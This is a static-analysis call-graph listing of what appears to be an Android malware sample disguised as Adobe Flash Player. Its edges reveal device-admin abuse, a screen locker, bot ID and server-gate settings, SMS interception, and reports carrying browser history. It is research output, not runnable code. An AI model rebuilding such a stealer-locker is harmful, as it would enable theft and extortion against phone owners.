VIRTUAL edge: $r1 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.AdobeUtil: java.lang.String readConfig(java.lang.String,android.content.Context)> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: $r1 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.FlashW: java.lang.String readConfig(java.lang.String,android.content.Context)> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: virtualinvoke r4.<java.io.OutputStreamWriter: void close()>() in <com.adobe.flashplayer_.FlashZ: void saveData(java.lang.String,java.lang.String,android.content.Context)> ==> <java.io.OutputStreamWriter: void close()>
SPECIAL edge: specialinvoke r2.<android.content.Intent: void <init>(java.lang.String)>("android.app.action.ADD_DEVICE_ADMIN") in <com.adobe.flashplayer_.FlashARM: void onCreate(android.os.Bundle)> ==> <android.content.Intent: void <init>(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(r1) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: virtualinvoke $r0.<com.adobe.packages.ZLocker: void onAttachedToWindow()>() in <dummyMainClass: com.adobe.packages.ZLocker dummyMainMethod_com_adobe_packages_ZLocker(android.content.Intent)> ==> <com.adobe.packages.ZLocker: void onAttachedToWindow()>
CLINIT edge: staticinvoke <android.provider.CallLog$Calls: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <android.provider.CallLog$Calls: void <clinit>()>
VIRTUAL edge: $r20 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.String toString()>
SPECIAL edge: specialinvoke $r16.<com.adobe.flashplayer_.AdobeFlashCore$1: void <init>(com.adobe.flashplayer_.AdobeFlashCore,long,long)>(r0, 90000L, 10000L) in <com.adobe.flashplayer_.AdobeFlashCore: void onCreate()> ==> <com.adobe.flashplayer_.AdobeFlashCore$1: void <init>(com.adobe.flashplayer_.AdobeFlashCore,long,long)>
VIRTUAL edge: $r21 = virtualinvoke $r19.<java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>(":", "") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>
SPECIAL edge: specialinvoke $r14.<com.adobe.flashplayer_.FlashVars: void <init>()>() in <com.adobe.flashplayer_.AdobeFlashCore: void onCreate()> ==> <com.adobe.flashplayer_.FlashVars: void <init>()>
VIRTUAL edge: $r24 = virtualinvoke r3.<java.io.File: java.lang.String getPath()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.io.File: java.lang.String getPath()>
SPECIAL edge: specialinvoke $r1.<android.view.View: void <init>(android.content.Context)>(null) in <dummyMainClass: com.adobe.flashplayer_.FlashZ dummyMainMethod_com_adobe_flashplayer___FlashZ(android.content.Intent)> ==> <android.view.View: void <init>(android.content.Context)>
VIRTUAL edge: $i0 = virtualinvoke r19.<java.lang.String: int indexOf(java.lang.String)>("Download") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.String: int indexOf(java.lang.String)>
VIRTUAL edge: $r24 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.String toString()>
SPECIAL edge: specialinvoke $r53.<java.lang.StringBuilder: void <init>(java.lang.String)>("Phone: ") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
VIRTUAL edge: $r1 = virtualinvoke r3.<java.io.BufferedReader: java.lang.String readLine()>() in <com.adobe.flashplayer_.Prefs: java.lang.String readConfig(java.lang.String,android.content.Context)> ==> <java.io.BufferedReader: java.lang.String readLine()>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("\r") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: $r5 = specialinvoke r0.<com.adobe.flashplayer_.AdobeUtil: java.lang.String readConfig(java.lang.String)>("BotID") in <com.adobe.flashplayer_.AdobeUtil: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)> ==> <com.adobe.flashplayer_.AdobeUtil: java.lang.String readConfig(java.lang.String)>
VIRTUAL edge: $r14 = virtualinvoke $r14.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&e=") in <com.adobe.flashplayer_.FlashW: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke r6.<java.lang.String: java.lang.String toString()>() in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: java.lang.String toString()>
SPECIAL edge: $r5 = specialinvoke r0.<com.adobe.flashplayer_.FlashZ: java.lang.String readConfig(java.lang.String,android.content.Context)>("BotPhone", $r1) in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashZ: java.lang.String readConfig(java.lang.String,android.content.Context)>
SPECIAL edge: specialinvoke r5.<java.lang.StringBuilder: void <init>()>() in <com.adobe.flashplayer_.adobeCore: java.lang.String readConfig(java.lang.String,android.content.Context)> ==> <java.lang.StringBuilder: void <init>()>
SPECIAL edge: specialinvoke $r56.<java.lang.StringBuilder: void <init>(java.lang.String)>($r21) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke r0.<com.adobe.flashplayer_.FlashURL: void writeConfig(java.lang.String,java.lang.String,android.content.Context)>("MacrosAState", "B", $r1) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashURL: void writeConfig(java.lang.String,java.lang.String,android.content.Context)>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.String: java.lang.String[] split(java.lang.String)> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
STATIC edge: r4 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>(r8) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
VIRTUAL edge: virtualinvoke $r2.<android.content.Intent: android.content.Intent setFlags(int)>(268435456) in <com.adobe.flashplayer_.ADOBEcoreZa: java.lang.CharSequence onDisableRequested(android.content.Context,android.content.Intent)> ==> <android.content.Intent: android.content.Intent setFlags(int)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&f=") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r54.<com.adobe.flashplayer_.FlashVirtual: void <init>()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <com.adobe.flashplayer_.FlashVirtual: void <init>()>
VIRTUAL edge: $i0 = virtualinvoke $r5.<java.lang.String: int indexOf(java.lang.String)>(",") in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: int indexOf(java.lang.String)>
VIRTUAL edge: r6 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.String toString()>
SPECIAL edge: $r20 = specialinvoke r0.<com.adobe.flashplayer_.AdobeUtil: java.lang.String readConfig(java.lang.String,android.content.Context)>("Reich_ServerGate", $r7) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <com.adobe.flashplayer_.AdobeUtil: java.lang.String readConfig(java.lang.String,android.content.Context)>
SPECIAL edge: specialinvoke $r1.<android.view.View: void <init>(android.content.Context)>(null) in <dummyMainClass: com.adobe.flashplayer_.AdobeUtil dummyMainMethod_com_adobe_flashplayer___AdobeUtil(android.content.Intent)> ==> <android.view.View: void <init>(android.content.Context)>
SPECIAL edge: specialinvoke $r17.<com.adobe.flashplayer_.Prefs$navW: void <init>(com.adobe.flashplayer_.Prefs,com.adobe.flashplayer_.Prefs$navW)>(r0, null) in <com.adobe.flashplayer_.Prefs: void <init>(android.content.Context,java.lang.String)> ==> <com.adobe.flashplayer_.Prefs$navW: void <init>(com.adobe.flashplayer_.Prefs,com.adobe.flashplayer_.Prefs$navW)>
SPECIAL edge: specialinvoke $r14.<java.lang.StringBuilder: void <init>(java.lang.String)>($r15) in <com.adobe.flashplayer_.FlashW: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
VIRTUAL edge: $r20 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: $r1 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.FlashURL: java.lang.String readConfig(java.lang.String,android.content.Context)> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: virtualinvoke r0.<com.adobe.flashplayer_.Prefs: void stopSelf()>() in <com.adobe.flashplayer_.Prefs: void <init>(android.content.Context,java.lang.String)> ==> <android.app.Service: void stopSelf()>
VIRTUAL edge: $r20 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: $r7 = virtualinvoke $r7.<java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>("+", "") in <com.adobe.flashplayer_.AdobeFlashCore: void onCreate()> ==> <java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>
VIRTUAL edge: r5 = virtualinvoke $r56.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(r25) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: r5 = virtualinvoke $r56.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r18) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: r3 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r1) in <com.adobe.flashplayer.Certificate: java.lang.String readConfig(java.lang.String,android.content.Context)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&g=") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r17 = virtualinvoke $r17.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r13) in <com.adobe.flashplayer_.FlashY: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&g=") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r14 = virtualinvoke $r14.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&e=") in <com.adobe.flashplayer_.FlashURL: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
STATIC edge: staticinvoke <dummyMainClass: com.adobe.flashplayer_.AdobeZCore dummyMainMethod_com_adobe_flashplayer___AdobeZCore(android.content.Intent)>(null) in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <dummyMainClass: com.adobe.flashplayer_.AdobeZCore dummyMainMethod_com_adobe_flashplayer___AdobeZCore(android.content.Intent)>
STATIC edge: $r20 = staticinvoke <java.lang.String: java.lang.String format(java.lang.String,java.lang.Object[])>("pid [%d] process [%s]\r", $r47) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.String: java.lang.String format(java.lang.String,java.lang.Object[])>
VIRTUAL edge: r4 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("\r\r") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(r6) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r24 = virtualinvoke r8.<java.lang.String: java.lang.String[] split(java.lang.String)>(" ") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: java.lang.String[] split(java.lang.String)>
VIRTUAL edge: r4 = virtualinvoke r4.<java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>("_", " ") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(";") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r22.<java.lang.StringBuilder: void <init>(java.lang.String)>($r17) in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(r4) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
STATIC edge: $r0 = staticinvoke <java.util.Calendar: java.util.Calendar getInstance()>() in <com.adobe.flashplayer_.AdobeUtil: java.lang.String millisToDate(long)> ==> <java.util.Calendar: java.util.Calendar getInstance()>
VIRTUAL edge: $r16 = virtualinvoke $r22.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r6) in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: virtualinvoke r0.<com.adobe.flashplayer_.FlashARM: void startActivityForResult(android.content.Intent,int)>($r1, 1) in <com.adobe.flashplayer_.FlashARM: void onActivityResult(int,int,android.content.Intent)> ==> <android.app.Activity: void startActivityForResult(android.content.Intent,int)>
VIRTUAL edge: r25 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r20) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: r4 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: r30 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.String toString()>
SPECIAL edge: specialinvoke $r53.<java.lang.StringBuilder: void <init>(java.lang.String)>("URL: ") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
VIRTUAL edge: $r4 = virtualinvoke $r6.<com.adobe.flashplayer.Certificate: android.content.Context getApplicationContext()>() in <com.adobe.flashplayer.Certificate$2: void onClick(android.view.View)> ==> <android.content.ContextWrapper: android.content.Context getApplicationContext()>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(r1) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke r0.<com.adobe.flashplayer_.AdobeUtil: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)>($r17, $r14, $r20, $r7) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <com.adobe.flashplayer_.AdobeUtil: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)>
VIRTUAL edge: $r1 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.FlashZ: java.lang.String readConfig(java.lang.String,android.content.Context)> ==> <java.lang.StringBuilder: java.lang.String toString()>
STATIC edge: r34 = staticinvoke <com.adobe.flashplayer_.FlashURL: java.lang.String millisToDate(long)>($l2) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashURL: java.lang.String millisToDate(long)>
VIRTUAL edge: $z0 = virtualinvoke $r6.<java.lang.String: boolean contains(java.lang.CharSequence)>("us") in <com.adobe.flashplayer_.Prefs: void <init>(android.content.Context,java.lang.String)> ==> <java.lang.String: boolean contains(java.lang.CharSequence)>
STATIC edge: r4 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>(r4) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
VIRTUAL edge: $r17 = virtualinvoke $r17.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(r3) in <com.adobe.flashplayer_.FlashY: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r14.<java.lang.StringBuilder: void <init>(java.lang.String)>("a=2&b=") in <com.adobe.flashplayer_.FlashURL: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
STATIC edge: staticinvoke <java.lang.System: void exit(int)>(0) in <com.adobe.flashplayer_.Prefs: void <init>(android.content.Context,java.lang.String)> ==> <java.lang.System: void exit(int)>
SPECIAL edge: specialinvoke r0.<java.lang.Exception: void <init>()>() in <java.lang.RuntimeException: void <init>(java.lang.String)> ==> <java.lang.Exception: void <init>()>
VIRTUAL edge: $r23 = virtualinvoke $r53.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("rfs=") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r53.<java.lang.StringBuilder: void <init>(java.lang.String)>("forceLock[") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
VIRTUAL edge: $r38 = virtualinvoke r0.<com.adobe.flashplayer_.AdobeUtil: android.content.Context getApplicationContext()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <android.content.ContextWrapper: android.content.Context getApplicationContext()>
SPECIAL edge: specialinvoke r0.<com.adobe.flashplayer_.AdobeUtil: void writeConfig(java.lang.String,java.lang.String,android.content.Context)>("MacrosAState", "A", $r2) in <com.adobe.flashplayer_.AdobeUtil: void execMod(java.lang.String,android.content.Context)> ==> <com.adobe.flashplayer_.AdobeUtil: void writeConfig(java.lang.String,java.lang.String,android.content.Context)>
VIRTUAL edge: virtualinvoke r0.<com.adobe.flashplayer_.Prefs: void stopSelf()>() in <com.adobe.flashplayer_.Prefs: void <init>(android.content.Context,java.lang.String)> ==> <android.app.Service: void stopSelf()>
STATIC edge: $r5 = staticinvoke <android.widget.Toast: android.widget.Toast makeText(android.content.Context,java.lang.CharSequence,int)>($r4, "Deleting error.\n\nWrong password of local storage. Please, try again.", 1) in <com.adobe.flashplayer.Certificate$2: void onClick(android.view.View)> ==> <android.widget.Toast: android.widget.Toast makeText(android.content.Context,java.lang.CharSequence,int)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(";") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r11 = virtualinvoke $r11.<java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>("+", "") in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>
VIRTUAL edge: virtualinvoke r0.<com.adobe.flashplayer_.FlashURL: void abortBroadcast()>() in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <android.content.BroadcastReceiver: void abortBroadcast()>
STATIC edge: $r43 = staticinvoke <java.util.regex.Pattern: java.util.regex.Pattern compile(java.lang.String)>("[A-z]{4}[0-9]{4}\\SON\\S") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.util.regex.Pattern: java.util.regex.Pattern compile(java.lang.String)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r22) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r53.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r20) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: r6 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: $r23 = virtualinvoke $r53.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r14) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.String: java.lang.String valueOf(java.lang.Object)> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke r0.<android.app.admin.DeviceAdminReceiver: void onEnabled(android.content.Context,android.content.Intent)>($r1, $r2) in <com.adobe.flashplayer_.ADOBEcoreZa: void onEnabled(android.content.Context,android.content.Intent)> ==> <android.app.admin.DeviceAdminReceiver: void onEnabled(android.content.Context,android.content.Intent)>
VIRTUAL edge: r5 = virtualinvoke $r56.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("|") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r53.<java.lang.StringBuilder: void <init>(java.lang.String)>(r30) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke $r1.<com.adobe.flashplayer_.AdobeZCore$1: void <init>(com.adobe.flashplayer_.AdobeZCore,long,long)>(r0, 90000L, 10L) in <com.adobe.flashplayer_.AdobeZCore: void onCreate()> ==> <com.adobe.flashplayer_.AdobeZCore$1: void <init>(com.adobe.flashplayer_.AdobeZCore,long,long)>
SPECIAL edge: specialinvoke $r56.<java.lang.StringBuilder: void <init>(java.lang.String)>("&b=") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke $r56.<java.lang.StringBuilder: void <init>(java.lang.String)>("&b=") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke $r22.<java.lang.StringBuilder: void <init>(java.lang.String)>("&b=") in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke r0.<android.os.CountDownTimer: void <init>(long,long)>($l0, $l1) in <com.adobe.flashplayer_.AdobeUtil$1: void <init>(com.adobe.flashplayer_.AdobeUtil,long,long)> ==> <android.os.CountDownTimer: void <init>(long,long)>
STATIC edge: staticinvoke <com.adobe.flashplayer.Certificate: java.lang.String access$0(com.adobe.flashplayer.Certificate,java.lang.String,android.content.Context)>($r3, "BotID", $r4) in <com.adobe.flashplayer.Certificate$2: void onClick(android.view.View)> ==> <com.adobe.flashplayer.Certificate: java.lang.String access$0(com.adobe.flashplayer.Certificate,java.lang.String,android.content.Context)>
VIRTUAL edge: $r20 = virtualinvoke r3.<java.io.File: java.lang.String toString()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.io.File: java.lang.String toString()>
VIRTUAL edge: $r1 = virtualinvoke r2.<java.io.BufferedReader: java.lang.String readLine()>() in <com.adobe.flashplayer_.AdobeFlashCore: java.lang.String readConfig(java.lang.String)> ==> <java.io.BufferedReader: java.lang.String readLine()>
VIRTUAL edge: virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r1) in <com.adobe.flashplayer_.AdobeUtil: java.lang.String readConfig(java.lang.String,android.content.Context)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r20) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(r8) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r22 = virtualinvoke r19.<java.lang.String: java.lang.String[] split(java.lang.String)>(" ") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.String: java.lang.String[] split(java.lang.String)>
VIRTUAL edge: r19 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r20) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r56.<java.lang.StringBuilder: void <init>()>() in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: void <init>()>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&e=") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&h=browser_history&i=cmd") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
